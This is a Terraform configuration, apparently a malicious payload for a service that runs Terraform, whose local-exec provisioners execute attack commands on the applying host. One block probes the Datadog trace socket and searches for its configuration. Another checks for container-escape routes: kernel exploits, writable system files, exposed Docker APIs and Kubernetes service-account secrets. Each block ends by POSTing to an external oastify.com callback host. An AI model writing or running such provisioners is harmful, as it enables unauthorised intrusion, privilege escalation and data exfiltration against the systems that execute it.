# main.tf - Proper Datadog Socket Exploitation
resource "null_resource" "datadog_socket_exploit" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== PROPER DATADOG SOCKET EXPLOITATION ==="
      
      # 1. Test socket connectivity with Python
      python3 -c "
      import socket
      import json
      
      try:
          s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
          s.connect('/var/datadog/trace.sock')
          print('DATADOG SOCKET CONNECTED - CRITICAL ACCESS')
          
          # Try to send trace data
          trace_data = {
              'traces': [[{
                  'trace_id': 12345,
                  'span_id': 67890,
                  'name': 'test_span',
                  'resource': 'test_resource',
                  'service': 'test_service',
                  'type': 'web',
                  'start': 1000000000000000000,
                  'duration': 1000000000,
                  'meta': {'test': 'value'}
              }]]
          }
          
          s.send(json.dumps(trace_data).encode() + b'\n')
          response = s.recv(1024)
          print('Response:', response)
          s.close()
          
      except Exception as e:
          print('Socket error:', e)
      "
      
      # 2. Check if we can find running Datadog processes
      echo "=== DATADOG PROCESS CHECK ==="
      ps aux | head -20
      
      # 3. Look for Datadog configuration
      echo "=== DATADOG CONFIG SEARCH ==="
      find /etc /opt /var -name "*datadog*" -type f 2>/dev/null | head -10
      
      # 4. Check socket permissions in detail
      echo "=== SOCKET PERMISSIONS ==="
      ls -la /var/datadog/trace.sock
      stat /var/datadog/trace.sock 2>/dev/null
      
      curl -X POST -d "datadog_socket_tested=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/datadog_socket
    EOT
  }
}

resource "null_resource" "alternative_escape" {
  provisioner "local-exec" {
    command = <<EOT
      echo "=== ALTERNATIVE ESCAPE VECTORS ==="
      
      # Since Datadog socket might not be active, let's try other critical attacks
      
      # 1. Kernel exploit check for 4.4.0
      echo "=== KERNEL 4.4.0 EXPLOITS ==="
      uname -a
      # Linux 4.4.0 has known exploits like Dirty COW
      
      # 2. Check for any writable system files
      echo "=== WRITABLE SYSTEM FILES ==="
      find /etc -writable -type f 2>/dev/null | head -10
      find /usr -writable -type f 2>/dev/null | head -10
      
      # 3. Check for shared memory attacks
      echo "=== SHARED MEMORY ==="
      ls -la /dev/shm/
      ipcs -a 2>/dev/null
      
      # 4. Check for any exposed Docker APIs
      echo "=== DOCKER API CHECK ==="
      curl -s http://172.17.0.1:2375/version 2>/dev/null && echo "DOCKER API EXPOSED - CRITICAL"
      curl -s http://172.17.0.1:2376/version 2>/dev/null && echo "DOCKER TLS API EXPOSED"
      
      # 5. Check for Kubernetes access
      echo "=== KUBERNETES CHECK ==="
      ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null && echo "KUBERNETES ENVIRONMENT - CRITICAL"
      
      curl -X POST -d "alternative_escape_checked=true" http://h3lzktqi1hjt2w12oea1ywqho8uzip6e.oastify.com/escape_vectors
    EOT
  }
}
